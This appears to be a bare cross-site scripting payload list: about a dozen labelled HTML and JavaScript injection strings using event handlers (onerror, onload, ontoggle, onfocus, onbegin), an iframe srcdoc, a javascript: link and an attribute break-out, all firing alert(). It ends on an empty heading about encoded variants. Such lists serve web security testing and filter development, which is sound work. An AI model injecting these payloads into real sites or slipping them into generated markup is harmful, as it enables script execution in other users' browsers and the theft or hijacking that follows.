# Classic image onerror
<img src=x onerror=alert(1)>
# Body onload
<body onload=alert(1)>
# SVG onload
<svg onload=alert(1)>
# SVG with animation
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
# Details toggle
<details open ontoggle=alert(1)>
# Input autofocus onfocus
<input autofocus onfocus=alert(1)>
# Marquee onstart
<marquee onstart=alert(1)>x</marquee>
# Video onerror
<video><source onerror=alert(1)>
# Iframe srcdoc
<iframe srcdoc="<script>alert(parent.domain)</script>">
# Script with javascript URI in anchor
<a href="javascript:alert(1)">click</a>

"><svg onload=alert(1)>

# Mixed case with encoded chars
